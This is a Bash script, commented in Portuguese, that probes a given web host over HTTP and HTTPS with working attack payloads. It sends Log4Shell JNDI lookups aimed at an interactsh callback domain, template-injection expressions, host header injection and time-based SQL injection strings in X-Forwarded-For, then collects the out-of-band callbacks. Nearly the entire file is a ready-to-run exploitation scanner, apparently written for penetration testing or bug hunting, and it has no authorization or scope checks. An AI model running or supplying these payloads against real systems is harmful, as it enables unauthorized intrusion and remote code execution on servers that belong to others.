#!/bin/bash
TARGET=$1

# Testa HTTP e HTTPS automaticamente
scan_target() {
  local url=$1
  local proto=$2

  echo ""
  echo "==============================="
  echo "[*] Protocolo: $proto → $url"
  echo "==============================="

  # Flags curl por protocolo
  if [ "$proto" == "HTTPS" ]; then
    CURL_FLAGS="-sk"  # -k ignora cert inválido
  else
    CURL_FLAGS="-s"
  fi

  # Log4Shell
  echo ""
  echo "=== Log4Shell ==="
  HEADERS=("User-Agent" "X-Api-Version" "X-Forwarded-For" "Referer" "X-Client-IP")
  for header in "${HEADERS[@]}"; do
    code=$(curl $CURL_FLAGS -o /dev/null -w "%{http_code}" --max-time 5 \
      -H "$header: \${jndi:ldap://$IACT_DOMAIN/a}" "$url")
    echo "[$code] $header"
  done

  # SSTI
  echo ""
  echo "=== SSTI ==="
  for payload in '{{7*7}}' '${7*7}' '*{7*7}' '#{7*7}'; do
    result=$(curl $CURL_FLAGS --max-time 5 -H "User-Agent: $payload" "$url")
    if echo "$result" | grep -q "49"; then
      echo "[FOUND] $payload"
    else
      echo "[    ] $payload"
    fi
  done

  # Host Header
  echo ""
  echo "=== Host Header Injection ==="
  for header in "Host" "X-Forwarded-Host" "X-Host"; do
    code=$(curl $CURL_FLAGS -o /dev/null -w "%{http_code}" --max-time 5 \
      -H "$header: $IACT_DOMAIN" "$url")
    echo "[$code] $header"
  done

  # XFF SQLi
  echo ""
  echo "=== XFF SQLi ==="
  for payload in "'" "' OR 1=1--" "1; SELECT SLEEP(5)--"; do
    time=$(curl $CURL_FLAGS -o /dev/null -w "%{time_total}" --max-time 10 \
      -H "X-Forwarded-For: $payload" "$url")
    echo "[${time}s] $payload"
  done
}

# Inicia interactsh
echo "[*] Iniciando interactsh-client..."
interactsh-client -json -o /tmp/interactsh_output.txt &
IACT_PID=$!
sleep 3

IACT_DOMAIN=$(cat /tmp/interactsh_output.txt | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        d = json.loads(line)
        if 'domain' in d:
            print(d['domain'])
            break
    except: pass
")

echo "[*] Domínio interactsh: $IACT_DOMAIN"

# Extrai host do target
HOST=$(echo $TARGET | sed 's|https\?://||' | cut -d'/' -f1)

# Roda nos dois protocolos
scan_target "http://$HOST" "HTTP"
scan_target "https://$HOST" "HTTPS"

# Aguarda callbacks
echo ""
echo "[*] Aguardando callbacks DNS por 15s..."
sleep 15

echo ""
echo "=== Callbacks recebidos ==="
cat /tmp/interactsh_output.txt | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        d = json.loads(line)
        if 'protocol' in d:
            print(f\"[{d.get('protocol','?').upper()}] de {d.get('remote-address','?')} → {d.get('full-id','?')}\")
    except: pass
"

kill $IACT_PID 2>/dev/null
rm -f /tmp/interactsh_output.txt

echo ""
echo "[*] Scan finalizado → $HOST"
